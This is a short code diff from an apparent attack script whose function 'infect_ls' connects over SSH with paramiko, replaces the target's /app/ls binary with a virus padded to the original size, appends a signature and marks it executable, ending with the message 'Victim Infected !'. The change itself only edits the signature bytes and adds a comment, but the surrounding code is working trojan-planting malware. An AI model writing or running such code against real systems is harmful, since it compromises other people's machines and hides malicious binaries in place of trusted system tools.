@@ -75,13 +75,13 @@ def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
     print(f"[*] new_ls.zip size: {new_ls_size}")
     print(f"[*] virus size: {virus_size}")
     
-    padding_size = int(ls_size) - int(virus_size) - 8
+    padding_size = int(ls_size) - int(virus_size) - 8  # last 8 bytes for signature
     
     print(f"[*] Padding size: {padding_size}")
 
     _stdin, stdout, stderr = client.exec_command('dd if=/dev/zero bs=' + str(padding_size) + ' count=1 >> /app/ls;')
     _stdin, stdout, stderr = client.exec_command("""
-        echo -n 'aabbccdd' | xxd -r -p >> /app/ls;
+        echo -n '20240000aabbccdd' | xxd -r -p >> /app/ls;
         chmod +x /app/ls;
         """)
     print(f"[*] Victim Infected !")
